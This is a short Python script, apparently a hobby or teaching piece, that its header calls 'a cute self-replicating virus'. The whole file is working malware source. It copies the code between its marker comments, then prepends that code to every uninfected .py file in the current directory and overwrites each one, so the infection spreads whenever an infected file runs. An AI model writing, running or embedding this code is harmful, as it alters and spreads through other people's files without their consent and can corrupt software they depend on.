"""
author: Ahmad Abu Hattab
date: 02/18/2022
A cute self-replicating virus!
"""

# Infects all files in our "scope" with
# code that self-replicates
# To do this, we'll need virus markers
# # VIRUS HI
# { code }
# # VIRUS BYE

# VIRUS HI

import sys
import glob

virus_code = []

# Read in all the lines of THIS file!
with open(sys.argv[0]) as file:
    lines = file.readlines()

self_replicating_part = False
# Loop through every line in the python file and check to see if we are inside
# of the virus code
for line in lines:
    if line == '# VIRUS HI\n':
        self_replicating_part = True
        virus_code.append(line)
    elif line == '# VIRUS BYE\n':
        self_replicating_part = False
        virus_code.append(line)
        break
    else:
        if self_replicating_part:
            virus_code.append(line)

# Look for other python files to infect!
python_files = glob.glob('*.py')
for py_file in python_files:
    with open(py_file) as f:
        file_code = f.readlines()
    # Check to see if this file is already infected!
    is_infected = False
    for line in file_code:
        if line == '# VIRUS HI\n':
            is_infected = True
            break

    # IF this file has nod been infected... then infect it!
    if not is_infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.append('\n')
        final_code.extend(file_code)

        # Write this to the file
        with open(py_file, 'w') as f:
            f.writelines(final_code)

# VIRUS BYE